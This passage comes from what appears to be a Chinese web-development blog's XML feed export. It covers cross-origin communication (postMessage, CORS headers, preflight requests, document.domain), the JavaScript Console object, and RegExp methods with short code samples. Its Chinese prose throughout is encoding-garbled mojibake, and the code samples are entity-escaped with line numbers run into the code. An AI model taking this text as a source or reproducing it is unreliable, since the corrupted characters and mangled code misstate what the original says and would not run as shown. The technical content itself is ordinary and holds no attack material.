postMessageè·¨åŸŸé€‚ç”¨äºŽä»¥ä¸‹åœºæ™¯ï¼šåŒæµè§ˆå™¨å¤šçª—å£é—´è·¨åŸŸé€šä¿¡ã€iframeé—´è·¨åŸŸé€šä¿¡ã€‚ CORSâ€è·¨åŸŸèµ„æºå…±äº«â€ï¼ˆCross-origin resource sharingï¼‰éœ€è¦æµè§ˆå™¨å’ŒåŽç«¯åŒæ—¶æ”¯æŒæœåŠ¡ç«¯è®¾ç½® Access-Control-Allow-Origin è¯¥å±žæ€§è¡¨ç¤ºå“ªäº›åŸŸåå¯ä»¥è®¿é—®èµ„æºï¼Œå¦‚æžœè®¾ç½®é€šé…ç¬¦åˆ™è¡¨ç¤ºæ‰€æœ‰ç½‘ç«™éƒ½å¯ä»¥è®¿é—®èµ„æºã€‚ Access-Control-Allow-Originç®€å•è¯´ï¼Œå…è®¸è·¨åŸŸè®¿é—®çš„hostï¼Œå¿…é¡»è®¾ç½®ï¼Œå¦åˆ™ä¸å…è®¸è·¨åŸŸã€‚ // å¦‚éœ€å…è®¸æ‰€æœ‰èµ„æºéƒ½å¯ä»¥è®¿é—®æ‚¨çš„èµ„æºï¼Œæ‚¨å¯ä»¥å¦‚æ­¤è®¾ç½®ï¼šAccess-Control-Allow-Origin: * // å¦‚éœ€å…è®¸https://developer.mozilla.orgè®¿é—®æ‚¨çš„èµ„æºï¼Œæ‚¨å¯ä»¥è®¾ç½®ï¼šAccess-Control-Allow-Origin: https://developer.mozilla.orgAccess-Control-Allow-Credentialså¦‚æžœæƒ³è·¨åŸŸä¼ è¾“cookies,éœ€è¦Access-Control-Allow-Credentialsä¸ŽXMLHttpRequest.withCredentials æˆ–Fetch APIä¸­çš„Request() æž„é€ å™¨ä¸­çš„credentials é€‰é¡¹ç»“åˆä½¿ç”¨ã€‚Credentialså¿…é¡»åœ¨å‰åŽç«¯éƒ½è¢«é…ç½®ï¼ˆå³the Access-Control-Allow-Credentials header å’Œ XHR æˆ–Fetch requestä¸­éƒ½è¦é…ç½®ï¼‰æ‰èƒ½ä½¿å¸¦credentialsçš„CORSè¯·æ±‚æˆåŠŸã€‚ Access-Control-Request-Methodå…è®¸è·¨åŸŸçš„è¯·æ±‚çš„æ–¹æ³•ã€‚ Access-Control-Allow-Methods: POST, GET, OPTIONSAccess-Control-Allow-Headersresponseçš„headerä¸­Access-Control-Allow-Headers ç”¨äºŽ preflight request ï¼ˆå³ä¼šåœ¨å®žé™…è¯·æ±‚å‘é€ä¹‹å‰å…ˆå‘é€ä¸€ä¸ªoptionè¯·æ±‚ï¼‰ä¸­ï¼Œåˆ—å‡ºäº†å°†ä¼šåœ¨æ­£å¼è¯·æ±‚çš„ Access-Control-Expose-Headers å­—æ®µä¸­å‡ºçŽ°çš„é¦–éƒ¨ä¿¡æ¯ã€‚ ç®€å•é¦–éƒ¨ï¼Œå¦‚ simple headersã€Acceptã€Accept-Languageã€Content-Languageã€Content-Type ï¼ˆåªé™äºŽè§£æžåŽçš„å€¼ä¸º application/x-www-form-urlencodedã€multipart/form-data æˆ– text/plain ä¸‰ç§MIMEç±»åž‹ï¼ˆä¸åŒ…æ‹¬å‚æ•°ï¼‰ï¼‰ï¼Œå®ƒä»¬å§‹ç»ˆæ˜¯è¢«æ”¯æŒçš„ï¼Œä¸éœ€è¦åœ¨è¿™ä¸ªé¦–éƒ¨ç‰¹æ„åˆ—å‡ºã€‚ preflight requestâ€“optionsè¯·æ±‚å¾ˆå¤šäººåœ¨æŠ“åŒ…æ—¶ä¼šå¾ˆéƒé—·æ€Žä¹ˆä¼šæ— ç«¯ç«¯å¤šå‡ºäº†ä¸€ä¸ªOPTIONSè¯·æ±‚ï¼Œè¯·ä¸è¦å¥‡æ€ªï¼Œè¿™åªæ˜¯CORSç­–ç•¥çš„é¢„æ£€è¯·æ±‚ï¼Œå°±åƒä½ è¦åŽ»è·Ÿåˆ«äººå€Ÿä¸ªä¸œè¥¿ï¼Œè¦å…ˆé—®é—®å¯¹æ–¹è‚¯ä¸è‚¯ä¸€æ ·ã€‚ ä»€ä¹ˆæƒ…å†µä¸‹ä¼šå‘é€OPTIONSè¯·æ±‚ï¼Ÿç®€å•çš„è¯´ï¼Œå°±æ˜¯æœ‰è‡ªå®šä¹‰headersï¼ŒContent-Typeçš„å€¼ä¸å±žäºŽä¸‹åˆ—ä¹‹ä¸€:application/x-www-form-urlencodedï¼Œmultipart/form-dataï¼Œtext/plainçš„è¯·æ±‚ä¼šè§¦å‘OPTIONSè¯·æ±‚ã€‚å¦‚æžœäº§ç”ŸOPTIONSè¯·æ±‚ï¼Œéœ€è¦åŽå°åŽ»å“åº”å®ƒï¼Œå…è®¸å®ƒè·¨åŸŸã€‚ ç®€å•è¯·æ±‚ï¼šåªè¦åŒæ—¶æ»¡è¶³ä»¥ä¸‹ä¸¤å¤§æ¡ä»¶ï¼Œå°±å±žäºŽç®€å•è¯·æ±‚æ¡ä»¶ 1ï¼šä½¿ç”¨ä¸‹åˆ—æ–¹æ³•ä¹‹ä¸€ï¼š GET HEAD POST æ¡ä»¶ 2ï¼šContent-Type çš„å€¼ä»…é™äºŽä¸‹åˆ—ä¸‰è€…ä¹‹ä¸€ï¼š text/plain multipart/form-data application/x-www-form-urlencoded document.domain çš„å€¼å¯ä»¥è®¾ç½®ä¸ºå…¶å½“å‰åŸŸæˆ–å…¶å½“å‰åŸŸçš„çˆ¶åŸŸï¼Œæ¥å…è®¸å­åŸŸå®‰å…¨è®¿é—®å…¶çˆ¶åŸŸæ—¶ï¼Œæ‚¨éœ€è¦åœ¨çˆ¶åŸŸå’Œå­åŸŸä¸­è®¾ç½® document.domain ä¸ºç›¸åŒçš„å€¼ã€‚ Nginxä»£ç† https://segmentfault.com/a/1190000015597029 https://zhuanlan.zhihu.com/p/53545472 https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy https://zhuanlan.zhihu.com/p/67489101 https://zhuanlan.zhihu.com/p/57991633]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript Console å¯¹è±¡]]></title>
    <url>%2F2018%2F11%2F24%2Fconsole%2F</url>
    <content type="text"><![CDATA[å‰è¨€ Console å¯¹è±¡ç”¨äºŽ JavaScript è°ƒè¯•ã€‚JavaScript åŽŸç”Ÿä¸­é»˜è®¤æ˜¯æ²¡æœ‰ Console å¯¹è±¡,è¿™æ˜¯å®¿ä¸»å¯¹è±¡ï¼ˆä¹Ÿå°±æ˜¯æ¸¸è§ˆå™¨ï¼‰æä¾›çš„å†…ç½®å¯¹è±¡ã€‚ ç”¨äºŽè®¿é—®è°ƒè¯•æŽ§åˆ¶å°, åœ¨ä¸åŒçš„æµè§ˆå™¨é‡Œæ•ˆæžœå¯èƒ½ä¸åŒã€‚ Console å¯¹è±¡å¸¸è§çš„ä¸¤ä¸ªç”¨é€”ï¼š æ˜¾ç¤ºç½‘é¡µä»£ç è¿è¡Œæ—¶çš„é”™è¯¯ä¿¡æ¯ã€‚ æä¾›äº†ä¸€ä¸ªå‘½ä»¤è¡ŒæŽ¥å£ï¼Œç”¨æ¥ä¸Žç½‘é¡µä»£ç äº’åŠ¨ã€‚ Chromeå’Œå¤§éƒ¨åˆ†æµè§ˆå™¨éƒ½å¯ä»¥é€šè¿‡F12è°ƒå‡ºè¿™ä¸ªçª—å£ åœ¨consoleé¢æ¿è¾“å…¥ for(var i in console){console.log(i)} å¯åˆ—å‡ºæ‰€æœ‰Consoleæ–¹æ³• log()consoleä¸Šè¿°çš„é›†ä¸­åº¦æ”¯æŒprintfçš„å ä½ç¬¦æ ¼å¼ï¼Œæ”¯æŒçš„å ä½ç¬¦æœ‰ï¼šå­—ç¬¦ï¼ˆ%sï¼‰ã€æ•´æ•°ï¼ˆ%dæˆ–%iï¼‰ã€æµ®ç‚¹æ•°ï¼ˆ%fï¼‰å’Œå¯¹è±¡ï¼ˆ%oï¼‰: å ä½ç¬¦ ä½œç”¨ %s å­—ç¬¦ä¸² %d or %i æ•´æ•° %f æµ®ç‚¹æ•° %o å¯å±•å¼€çš„DOM %O åˆ—å‡ºDOMçš„å±žæ€§ %c æ ¹æ®æä¾›çš„cssæ ·å¼æ ¼å¼åŒ–å­—ç¬¦ä¸² åœ¨console.logé‡Œä½¿ç”¨CSSï¼š info() warn() error() assert()assertæ–¹æ³•æŽ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è¡¨è¾¾å¼ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯å­—ç¬¦ä¸²ã€‚åªæœ‰å½“ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºfalseï¼Œæ‰ä¼šè¾“å‡ºç¬¬äºŒä¸ªå‚æ•°ï¼Œå¦åˆ™ä¸ä¼šæœ‰ä»»ä½•ç»“æžœã€‚ clear()æ¸…é™¤å½“å‰æŽ§åˆ¶å°çš„æ‰€æœ‰è¾“å‡ºï¼Œå°†å…‰æ ‡å›žç½®åˆ°ç¬¬ä¸€è¡Œã€‚ count()ç”¨äºŽè®¡æ•°ï¼Œè¾“å‡ºå®ƒè¢«è°ƒç”¨äº†å¤šå°‘æ¬¡ã€‚ group() /groupCollapsed()/ groupEnd()ç”¨äºŽå°†æ˜¾ç¤ºçš„ä¿¡æ¯åˆ†ç»„ï¼Œå¯ä»¥æŠŠä¿¡æ¯è¿›è¡ŒæŠ˜å å’Œå±•å¼€ã€‚ ä¸Žconsole.groupæ–¹æ³•å¾ˆç±»ä¼¼ï¼Œå”¯ä¸€çš„åŒºåˆ«æ˜¯è¯¥ç»„çš„å†…å®¹ï¼Œåœ¨ç¬¬ä¸€æ¬¡æ˜¾ç¤ºæ—¶æ˜¯æ”¶èµ·çš„ï¼ˆcollapsedï¼‰ï¼Œè€Œä¸æ˜¯å±•å¼€çš„ã€‚ table()å°†å¤åˆç±»åž‹çš„æ•°æ®è½¬ä¸ºè¡¨æ ¼æ˜¾ç¤º time()è®¡æ—¶ trace()è¿½è¸ªå‡½æ•°çš„è°ƒç”¨è¿‡ç¨‹ dirxml()ç”¨æ¥æ˜¾ç¤ºç½‘é¡µçš„æŸä¸ªèŠ‚ç‚¹ï¼ˆnodeï¼‰æ‰€åŒ…å«çš„html/xmlä»£ç ã€‚ profile() æ€§èƒ½åˆ†æžï¼ˆProfilerï¼‰å°±æ˜¯åˆ†æžç¨‹åºå„ä¸ªéƒ¨åˆ†çš„è¿è¡Œæ—¶é—´ï¼Œæ‰¾å‡ºç“¶é¢ˆæ‰€åœ¨ã€‚ 123456789101112131415function All() &#123; for (var i = 0; i &lt; 10; i++) &#123; funcA(1000); &#125; funcB(10000); &#125;function funcA(count) &#123; for (var i = 0; i &lt; count; i++) &#123;&#125; &#125;function funcB(count) &#123; for (var i = 0; i &lt; count; i++) &#123;&#125; &#125;console.profile(&apos;æ€§èƒ½åˆ†æžå™¨&apos;);All(); console.profileEnd(); dir()console.dir()æ–¹æ³•ç”¨æ¥å¯¹ä¸€ä¸ªå¯¹è±¡è¿›è¡Œæ£€æŸ¥ï¼Œå¹¶ä»¥æ˜“äºŽé˜…è¯»å’Œæ‰“å°çš„æ ¼å¼æ˜¾ç¤ºã€‚ç±»ä¼¼äºŽlog()ï¼Œä½†å¯ä»¥æ˜¾ç¤ºä¸€ä¸ªå¯¹è±¡æ‰€æœ‰çš„å±žæ€§å’Œæ–¹æ³•ã€‚]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RegExpæ­£åˆ™è¡¨è¾¾å¼]]></title>
    <url>%2F2018%2F07%2F13%2Fregexp%2F</url>
    <content type="text"><![CDATA[å‰è¨€ æ­£åˆ™è¡¨è¾¾å¼ å®šä¹‰æ­£åˆ™è¡¨è¾¾å¼ï¼Œåˆç§°è§„åˆ™è¡¨è¾¾å¼ã€‚ï¼ˆè‹±è¯­ï¼šRegular Expressionï¼Œåœ¨ä»£ç ä¸­å¸¸ç®€å†™ä¸ºregexã€RegExpæˆ–REï¼‰ï¼Œè®¡ç®—æœºç§‘å­¦çš„ä¸€ä¸ªæ¦‚å¿µã€‚åœ¨ç¼–å†™å¤„ç†å­—ç¬¦ä¸²çš„ç¨‹åºæˆ–ç½‘é¡µæ—¶ï¼Œç»å¸¸ä¼šæœ‰æŸ¥æ‰¾ç¬¦åˆæŸäº›å¤æ‚è§„åˆ™çš„å­—ç¬¦ä¸²çš„éœ€è¦ã€‚æ­£åˆ™è¡¨è¾¾å¼å°±æ˜¯ç”¨äºŽæè¿°è¿™äº›è§„åˆ™çš„å·¥å…·ã€‚æ¢å¥è¯è¯´ï¼Œæ­£åˆ™è¡¨è¾¾å¼å°±æ˜¯è®°å½•æ–‡æœ¬è§„åˆ™çš„ä»£ç ã€‚æ­£åˆ™è¡¨è¾¾å¼é€šå¸¸è¢«ç”¨æ¥æ£€ç´¢ã€æ›¿æ¢é‚£äº›ç¬¦åˆæŸä¸ªæ¨¡å¼(è§„åˆ™)çš„æ–‡æœ¬ã€‚ æ­£åˆ™è¡¨è¾¾å¼æ˜¯å¯¹å­—ç¬¦ä¸²æ“ä½œçš„ä¸€ç§é€»è¾‘å…¬å¼ï¼Œå°±æ˜¯ç”¨äº‹å…ˆå®šä¹‰å¥½çš„ä¸€äº›ç‰¹å®šå­—ç¬¦ã€åŠè¿™äº›ç‰¹å®šå­—ç¬¦çš„ç»„åˆï¼Œç»„æˆä¸€ä¸ªâ€œè§„åˆ™å­—ç¬¦ä¸²â€ï¼Œè¿™ä¸ªâ€œè§„åˆ™å­—ç¬¦ä¸²â€ç”¨æ¥è¡¨è¾¾å¯¹å­—ç¬¦ä¸²çš„ä¸€ç§è¿‡æ»¤é€»è¾‘ã€‚ æµ‹è¯•Javascriptæ­£åˆ™è¡¨è¾¾å¼åœ¨çº¿æµ‹è¯•å·¥å…·[https://www.regexpal.com/][https://regexr.com/] ä½œç”¨ï¼šåœ¨å­—ç¬¦ä¸²æ“ä½œä¸­å¸¸ç”¨äºŽï¼š éªŒè¯ï¼ˆç»™å®šçš„å­—ç¬¦ä¸²æ˜¯å¦ç¬¦åˆæ­£åˆ™è¡¨è¾¾å¼çš„è¿‡æ»¤é€»è¾‘ï¼‰ éªŒè¯è¾“å…¥æ˜¯å¦ç¬¦åˆè§„èŒƒ æŸ¥æ‰¾ï¼ˆå¯ä»¥é€šè¿‡æ­£åˆ™è¡¨è¾¾å¼ï¼Œä»Žå­—ç¬¦ä¸²ä¸­èŽ·å–æˆ‘ä»¬æƒ³è¦çš„ç‰¹å®šéƒ¨åˆ†ï¼‰ æŸ¥æ‰¾æ‰€éœ€å­—ç¬¦æ®µè½ æ›¿æ¢æˆè‡ªå·±æƒ³è¦çš„å†…å®¹ è¿˜æœ‰ä¸€äº›ç‰¹æ®Šçš„æ“ä½œ åœ¨HTMLä¸­å¯ä»¥è¿™æ ·ä½¿ç”¨ 12345&lt;style&gt;input:invalid &#123; border-color: red; &#125; input, input:valid &#123; border-color: #ccc; &#125;&lt;/style&gt;&lt;input type=&quot;text&quot; name=&quot;tel&quot; placeholder=&quot;tel&quot; pattern=&quot;\d&#123;11&#125;&quot;&gt; å£°æ˜Ž123var expression = / pattern / flags;var expression = new RegExp(&quot; patterns &quot; , &quot; flags &quot;);//patternsä¸ºpatternä¸­æ¯ä¸ªå…ƒå­—ç¬¦å‰åŠ ä¸€ä¸ª\ç»„æˆæˆ–è€…ç”±å­—ç¬¦ä¸²åŠ å˜é‡ç»„æˆ expressionï¼šæ­£åˆ™è¡¨è¾¾å¼çš„åç§° patternï¼šæ­£åˆ™è¡¨è¾¾å¼çš„æ¨¡å¼ flagsï¼šæ ‡å¿—ï¼ŒåŒ…æ‹¬ g:global,åº”ç”¨äºŽæ‰€æœ‰å­—ç¬¦ä¸²ï¼Œè€Œéžåœ¨å‘çŽ°ç¬¬ä¸€ä¸ªåŒ¹é…é¡¹æ—¶ç«‹å³åœæ­¢ i:case-insesitive,å¿½ç•¥å¤§å°å†™ m:multiline,å¤šè¡Œæ£€æµ‹ u:Unicode,ç”¨æ¥æ­£ç¡®å¤„ç†å¤§äºŽ\uFFFFd Unicodeå­—ç¬¦æ³¨æ„ï¼šç‚¹ï¼ˆ.ï¼‰å­—ç¬¦åœ¨æ­£åˆ™è¡¨è¾¾å¼ä¸­ï¼Œå«ä¹‰æ˜¯é™¤äº†æ¢è¡Œç¬¦ä»¥å¤–çš„ä»»æ„å•ä¸ªå­—ç¬¦ã€‚å¯¹äºŽç ä½å¤§äºŽ0xFFFFçš„ Unicode å­—ç¬¦ï¼Œç‚¹å­—ç¬¦ä¸èƒ½è¯†åˆ«ï¼Œå¿…é¡»åŠ ä¸Šuä¿®é¥°ç¬¦ y:sticky,yä¿®é¥°ç¬¦çš„ä½œç”¨ä¸Žgä¿®é¥°ç¬¦ç±»ä¼¼ï¼Œä¹Ÿæ˜¯å…¨å±€åŒ¹é…ï¼ŒåŽä¸€æ¬¡åŒ¹é…éƒ½ä»Žä¸Šä¸€æ¬¡åŒ¹é…æˆåŠŸçš„ä¸‹ä¸€ä¸ªä½ç½®å¼€å§‹ã€‚ä¸åŒä¹‹å¤„åœ¨äºŽï¼Œgä¿®é¥°ç¬¦åªè¦å‰©ä½™ä½ç½®ä¸­å­˜åœ¨åŒ¹é…å°±å¯ï¼Œè€Œyä¿®é¥°ç¬¦ç¡®ä¿åŒ¹é…å¿…é¡»ä»Žå‰©ä½™çš„ç¬¬ä¸€ä¸ªä½ç½®å¼€å§‹ï¼Œè¿™ä¹Ÿå°±æ˜¯â€œç²˜è¿žâ€çš„æ¶µä¹‰ã€‚ å®žä¾‹å±žæ€§ å±žæ€§ æ•°æ®ç±»åž‹ æ„ä¹‰ global boolean æ˜¯å¦æœ‰gæ ‡å¿— ignoreCase boolean æ˜¯å¦æœ‰iæ ‡å¿— multiline boolean æ˜¯å¦æœ‰mæ ‡å¿— lastIndex int ä»Žç¬¬å‡ ä¸ªå­—ç¬¦å¼€å§‹åŒ¹é… source str æ­£åˆ™è¡¨è¾¾å¼çš„å­—ç¬¦ä¸²è¡¨ç¤º flags str æ­£åˆ™è¡¨è¾¾å¼çš„ä¿®é¥°ç¬¦ sticky boolean æ˜¯å¦æœ‰yæ ‡ç­¾ RegExpå®žä¾‹æ–¹æ³•regObj.test(strObj)ç”¨äºŽæµ‹è¯•å­—ç¬¦ä¸²ä¸­æ˜¯å¦å­˜åœ¨ç¬¦åˆæ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼çš„éƒ¨åˆ†ï¼Œå¦‚æžœå­˜åœ¨åˆ™è¿”å›žtrueï¼Œå¦åˆ™è¿”å›žfalseã€‚123456789var test = function()&#123; var PhoneNumber = /^\d&#123;11&#125;$/; var number1 = &quot;17802015408&quot;; var number2 = &quot;1530775669&quot;; var number3 = &quot;178020154080&quot;; console.log(&quot;number1 is a &quot; + PhoneNumber.test(number1) + &quot; phone number.&quot;); console.log(&quot;number2 is a &quot; + PhoneNumber.test(number2) + &quot; phone number.&quot;); console.log(&quot;number3 is a &quot; + PhoneNumber.test(number3) + &quot; phone number.&quot;);&#125;() regObj.exec(strObj)æ–¹æ³•ç”¨äºŽæ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼åœ¨å­—ç¬¦ä¸²ä¸­è¿è¡ŒæŸ¥æ‰¾ï¼Œå¦‚æžœ exec() æ‰¾åˆ°äº†åŒ¹é…çš„æ–‡æœ¬ï¼Œåˆ™è¿”å›žä¸€ä¸ªç»“æžœæ•°ç»„ã€‚å¦åˆ™ï¼Œè¿”å›ž nullã€‚é™¤äº†æ•°ç»„å…ƒç´ å’Œ length å±žæ€§ä¹‹å¤–ï¼Œexec() æ–¹æ³•è¿˜è¿”å›žä¸¤ä¸ªå±žæ€§ã€‚index å±žæ€§å£°æ˜Žçš„æ˜¯åŒ¹é…æ–‡æœ¬çš„ç¬¬ä¸€ä¸ªå­—ç¬¦çš„ä½ç½®ã€‚input å±žæ€§åˆ™å­˜æ”¾çš„æ˜¯è¢«æ£€ç´¢çš„å­—ç¬¦ä¸² stringã€‚ è°ƒç”¨éžå…¨å±€çš„ RegExpå¯¹è±¡çš„ exec() æ—¶ï¼Œè¿”å›žæ•°ç»„çš„ç¬¬ 0 ä¸ªå…ƒç´ æ˜¯ä¸Žæ­£åˆ™è¡¨è¾¾å¼ç›¸åŒ¹é…çš„æ–‡æœ¬ï¼Œç¬¬ 1 ä¸ªå…ƒç´ æ˜¯ä¸Ž RegExpObject çš„ç¬¬ 1 ä¸ªåˆ†ç»„ç›¸åŒ¹é…çš„æ–‡æœ¬ï¼ˆå¦‚æžœæœ‰çš„è¯ï¼‰ï¼Œç¬¬ 2 ä¸ªå…ƒç´ æ˜¯ä¸Ž RegExpå¯¹è±¡çš„ç¬¬ 2 ä¸ªåˆ†ç»„ç›¸åŒ¹é…çš„æ–‡æœ¬ï¼ˆå¦‚æžœæœ‰çš„è¯ï¼‰ï¼Œä»¥æ­¤ç±»æŽ¨ã€‚ è°ƒç”¨å…¨å±€çš„RegExpå¯¹è±¡çš„ exec() æ—¶ï¼Œå®ƒä¼šåœ¨ RegExpå®žä¾‹çš„ lastIndex å±žæ€§æŒ‡å®šçš„å­—ç¬¦å¤„å¼€å§‹æ£€ç´¢å­—ç¬¦ä¸² stringã€‚å½“ exec() æ‰¾åˆ°äº†ä¸Žè¡¨è¾¾å¼ç›¸åŒ¹é…çš„æ–‡æœ¬æ—¶ï¼Œåœ¨åŒ¹é…åŽï¼Œå®ƒå°†æŠŠ RegExpå®žä¾‹çš„ lastIndex å±žæ€§è®¾ç½®ä¸ºåŒ¹é…æ–‡æœ¬çš„æœ€åŽä¸€ä¸ªå­—ç¬¦çš„ä¸‹ä¸€ä¸ªä½ç½®ã€‚å¯ä»¥é€šè¿‡åå¤è°ƒç”¨ exec() æ–¹æ³•æ¥éåŽ†å­—ç¬¦ä¸²ä¸­çš„æ‰€æœ‰åŒ¹é…æ–‡æœ¬ã€‚å½“ exec() å†ä¹Ÿæ‰¾ä¸åˆ°åŒ¹é…çš„æ–‡æœ¬æ—¶ï¼Œå®ƒå°†è¿”å›ž nullï¼Œå¹¶æŠŠ lastIndex å±žæ€§é‡ç½®ä¸º 0ã€‚1234567891011121314151617181920212223242526272829//æ— gæ ‡å¿—var execs = function()&#123; var text = &quot;abababab&quot;; var pattern = /ab(ab)/; console.log(pattern.exec(text)); console.log(pattern.lastIndex); console.log(pattern.exec(text)); console.log(pattern.lastIndex); console.log(pattern.exec(text)); console.log(pattern.lastIndex);&#125;()//æœ‰gæ ‡å¿—var execg = function()&#123; var text = &quot;AbAbBCAb&quot;; var pattern = /Ab|BC/g; //pattern.lastIndex = 1; //æ”¹å˜lastIndexå±žæ€§ console.log(pattern.lastIndex); console.log(pattern.exec(text)); console.log(pattern.lastIndex); console.log(pattern.exec(text)); console.log(pattern.lastIndex); console.log(pattern.exec(text)); console.log(pattern.lastIndex); console.log(pattern.exec(text)); console.log(pattern.lastIndex);&#125;() å­—ç¬¦ä¸²æ–¹æ³•strObj.search(RegObj)search() æ–¹æ³•ç”¨äºŽæ£€ç´¢å­—ç¬¦ä¸²ä¸­æŒ‡å®šçš„å­å­—ç¬¦ä¸²ï¼Œæˆ–æ£€ç´¢ä¸Žæ­£åˆ™è¡¨è¾¾å¼ç›¸åŒ¹é…çš„å­å­—ç¬¦ä¸²ã€‚search() æ–¹æ³•ä¸æ‰§è¡Œå…¨å±€åŒ¹é…ï¼Œå®ƒå°†å¿½ç•¥æ ‡å¿— gã€‚å®ƒåŒæ—¶å¿½ç•¥ regexp çš„ lastIndexå±žæ€§ï¼Œå¹¶ä¸”æ€»æ˜¯ä»Žå­—ç¬¦ä¸²çš„å¼€å§‹è¿›è¡Œæ£€ç´¢ï¼Œè¿™æ„å‘³ç€å®ƒæ€»æ˜¯è¿”å›ž stringObject çš„ç¬¬ä¸€ä¸ªåŒ¹é…çš„ä½ç½®ã€‚æ²¡æœ‰åŒ¹é…åˆ™è¿”å›ž-1ã€‚ 12345678910var search = function()&#123; var text = &quot;asdfasAAAAAA&quot;; var pattern = /AA/g; var te = &quot;AA&quot; console.log(text.search(pattern)); console.log(text.indexOf(te)); var example = &quot;adfasd9ad1s1f&quot;; var pattern2 = /\d/g; console.log(example.charAt(example.search(pattern2)))ï¼›&#125;() strObj.match(RegObj)å­—ç¬¦ä¸²å¯¹è±¡çš„matchæ–¹æ³•ä¸Žæ­£åˆ™å¯¹è±¡çš„execæ–¹æ³•æ¯”è¾ƒç±»ä¼¼ï¼Œä½†æ˜¯å¦‚æžœæ­£åˆ™è¡¨è¾¾å¼å¸¦æœ‰gä¿®é¥°ç¬¦ï¼Œé‚£ä¹ˆmatchæ–¹æ³•å°±å¯ä»¥ä»¥æ•°ç»„çš„æ–¹å¼è¿”å›žæ‰€æœ‰æˆåŠŸåŒ¹é…çš„ç»“æžœï¼Œä½†æ˜¯execæ–¹æ³•åªè¿”å›žäº†ä¸€ä¸ªã€‚å¦‚æžœä¸å¸¦gï¼Œåˆ™æ˜¯è¿”å›žå…¶åˆ†ç»„ç»“æžœã€‚ 12345var match = function()&#123; var text=&quot;asdfasdasdfasdfadsf&quot; var pattern = /a(sd)/g; console.log(text.match(pattern))&#125;() strObj.replace(regObj,replaceStr|function(){})1stringObject.replace(regexp/substr,replacement) å­—ç¬¦ä¸² stringObject çš„ replace() æ–¹æ³•æ‰§è¡Œçš„æ˜¯æŸ¥æ‰¾å¹¶æ›¿æ¢çš„æ“ä½œã€‚å®ƒå°†åœ¨ stringObject ä¸­æŸ¥æ‰¾ä¸Ž regexp ç›¸åŒ¹é…çš„å­å­—ç¬¦ä¸²ï¼Œç„¶åŽç”¨ replacement æ¥æ›¿æ¢è¿™äº›å­ä¸²ã€‚å¦‚æžœ regexp å…·æœ‰å…¨å±€æ ‡å¿— gï¼Œé‚£ä¹ˆ replace() æ–¹æ³•å°†æ›¿æ¢æ‰€æœ‰åŒ¹é…çš„å­ä¸²ã€‚å¦åˆ™ï¼Œå®ƒåªæ›¿æ¢ç¬¬ä¸€ä¸ªåŒ¹é…å­ä¸²ã€‚ replacement å¯ä»¥æ˜¯å­—ç¬¦ä¸²ï¼Œä¹Ÿå¯ä»¥æ˜¯å‡½æ•°ã€‚å¦‚æžœå®ƒæ˜¯å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆæ¯ä¸ªåŒ¹é…éƒ½å°†ç”±å­—ç¬¦ä¸²æ›¿æ¢ã€‚ä½†æ˜¯ replacement ä¸­çš„ $ å­—ç¬¦å…·æœ‰ç‰¹å®šçš„å«ä¹‰ã€‚å¦‚ä¸‹è¡¨æ‰€ç¤ºï¼Œå®ƒè¯´æ˜Žä»Žæ¨¡å¼åŒ¹é…å¾—åˆ°çš„å­—ç¬¦ä¸²å°†ç”¨äºŽæ›¿æ¢ã€‚ å­—ç¬¦ æ›¿æ¢æ–‡æœ¬ \$1ã€\$2ã€â€¦ã€\$99 ä¸Ž regexp ä¸­çš„ç¬¬ 1 åˆ°ç¬¬ 99 ä¸ªå­è¡¨è¾¾å¼ç›¸åŒ¹é…çš„æ–‡æœ¬ã€‚ \$&amp; ä¸Ž regexp ç›¸åŒ¹é…çš„å­ä¸²ã€‚ \$` ä½äºŽåŒ¹é…å­ä¸²å·¦ä¾§çš„æ–‡æœ¬ã€‚ \$â€™ ä½äºŽåŒ¹é…å­ä¸²å³ä¾§çš„æ–‡æœ¬ã€‚ \$$ ç›´æŽ¥é‡ç¬¦å·ã€‚ æ³¨æ„ï¼šECMAScript v3 è§„å®šï¼Œreplace() æ–¹æ³•çš„å‚æ•° replacement å¯ä»¥æ˜¯å‡½æ•°è€Œä¸æ˜¯å­—ç¬¦ä¸²ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ¯ä¸ªåŒ¹é…éƒ½è°ƒç”¨è¯¥å‡½æ•°ï¼Œå®ƒè¿”å›žçš„å­—ç¬¦ä¸²å°†ä½œä¸ºæ›¿æ¢æ–‡æœ¬ä½¿ç”¨ã€‚è¯¥å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯åŒ¹é…æ¨¡å¼çš„å­—ç¬¦ä¸²ã€‚æŽ¥ä¸‹æ¥çš„å‚æ•°æ˜¯ä¸Žæ¨¡å¼ä¸­çš„å­è¡¨è¾¾å¼åŒ¹é…çš„å­—ç¬¦ä¸²ï¼Œå¯ä»¥æœ‰ 0 ä¸ªæˆ–å¤šä¸ªè¿™æ ·çš„å‚æ•°ã€‚æŽ¥ä¸‹æ¥çš„å‚æ•°æ˜¯ä¸€ä¸ªæ•´æ•°ï¼Œå£°æ˜Žäº†åŒ¹é…åœ¨ stringObject ä¸­å‡ºçŽ°çš„ä½ç½®ã€‚æœ€åŽä¸€ä¸ªå‚æ•°æ˜¯ stringObject æœ¬èº«ã€‚1234567891011121314//ä¸ä½¿ç”¨æ­£åˆ™var replace = function()&#123; var text = &apos;1&lt;%2%&gt;34&lt;%567%&gt;89&apos;; text = text.replace(&apos;&lt;&apos;,&apos;@&apos;); text = text.replace(&apos;%&apos;,&apos;#&apos;); text = text.replace(&apos;&gt;&apos;,&apos;@&apos;); console.log(text);&#125;()//ä½¿ç”¨æ­£åˆ™var replace = function()&#123; var text = &apos;1&lt;%2%&gt;34&lt;%567%&gt;89&apos;; text = text.replace(/&lt;%(\d+)%&gt;/g,&apos;@#$1#@&apos;); console.log(text);&#125;() strObj.split(regObj)1stringObject.split(separator,howmany) 